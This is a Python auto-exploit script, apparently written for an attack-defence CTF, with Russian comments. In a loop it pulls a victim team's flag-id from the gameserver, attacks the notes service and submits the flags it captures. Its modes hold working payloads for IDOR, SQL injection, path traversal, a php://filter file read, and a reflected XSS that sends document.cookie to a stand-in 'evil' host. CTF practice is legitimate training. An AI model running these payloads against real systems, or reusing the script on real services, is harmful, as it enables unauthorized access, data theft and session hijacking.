#!/usr/bin/env python3
"""
attacker — автоэксплойт против notes-сервиса жертвы (как делает соседняя команда).

Бьёт со своей машины (10.60.N.x), НЕ с вулнбокса. Цикл:
  1) берёт свежий flag-id жертвы у геймсервера   GET /flagids?team=<victim>
  2) эксплойтит IDOR                               GET http://<victim_vulnbox>/note?id=<flagid>
  3) вытаскивает флаг и сдаёт                       POST /submit

ENV: VICTIM_TEAM, VICTIM_IP, GS=gameserver ip, PERIOD, BURST (сколько запросов за итерацию).
Только stdlib.
"""
import os
import re
import time
import urllib.request
from urllib.parse import quote

GS = os.environ.get("GS", "10.60.254.1")
VICTIM_TEAM = os.environ.get("VICTIM_TEAM", "13")
VICTIM_IP = os.environ.get("VICTIM_IP", "10.60.13.1")
PERIOD = float(os.environ.get("PERIOD", "5"))
BURST = int(os.environ.get("BURST", "1"))
MODE = os.environ.get("MODE", "query")  # query | path | body — форма эксплойта
FLAG_RE = re.compile(r"uralcup\{[^}]{1,80}\}")


def get(url, timeout=3):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read().decode(errors="replace")


def post(url, data, timeout=3):
    req = urllib.request.Request(url, data=data.encode(), method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="replace")


def need_flagid():
    return MODE in ("query", "path", "body")


def exploit():
    """Возвращает (тело_ответа, метка) или (None, причина). Разные классы эксплойта."""
    fid = None
    if need_flagid():
        try:
            meta = get(f"http://{GS}:80/flagids?team={VICTIM_TEAM}")
        except Exception as e:
            return None, f"flagids-fail {e}"
        m = re.search(r'"flagid":\s*"([0-9a-f]+)"', meta)
        if not m:
            return None, "no-flagid-yet"
        fid = m.group(1)
    try:
        if MODE == "query":
            return get(f"http://{VICTIM_IP}:80/note?id={fid}"), f"idor-query id={fid}"
        if MODE == "path":
            return get(f"http://{VICTIM_IP}:80/v2/read/{fid}"), f"idor-path id={fid}"
        if MODE == "body":
            return post(f"http://{VICTIM_IP}:80/lookup",
                        '{"ref": "%s"}' % fid), f"idor-body id={fid}"
        if MODE == "sqli":
            inj = "' OR '1'='1' -- -"
            return get(f"http://{VICTIM_IP}:80/search?q={quote(inj)}"), "sqli-union"
        if MODE == "lfi":
            return get(f"http://{VICTIM_IP}:80/download?file=../../../flags/current"), "lfi-traversal"
        if MODE == "php":
            return get("http://%s:80/download?file=%s" % (
                VICTIM_IP, quote("php://filter/convert.base64-encode/resource=flags/current"))), "php-wrapper"
        if MODE == "xss":
            return get("http://%s:80/echo?msg=%s" % (
                VICTIM_IP, quote("<script>document.location='http://evil/'+document.cookie</script>"))), "xss-reflected"
    except Exception as e:
        return None, f"exploit-fail {e}"
    return None, "unknown-mode"


def once():
    body, label = exploit()
    if body is None:
        print(f"[atk/{MODE}] {label}", flush=True)
        return
    fm = FLAG_RE.search(body)
    if not fm:
        # XSS/php-проба без плейнтекст-флага — это ожидаемо (recon)
        print(f"[atk/{MODE}] {label} -> no plaintext flag (probe)", flush=True)
        return
    flag = fm.group(0)
    try:
        v = post(f"http://{GS}:80/submit", flag).strip()
    except Exception as e:
        v = f"submit-fail {e}"
    print(f"[atk/{MODE}] {label} flag={flag[:12]}.. submit={v}", flush=True)


if __name__ == "__main__":
    print(f"[atk] target team{VICTIM_TEAM}@{VICTIM_IP} via GS {GS} period={PERIOD}s burst={BURST}",
          flush=True)
    time.sleep(3)
    while True:
        for _ in range(BURST):
            once()
        time.sleep(PERIOD)
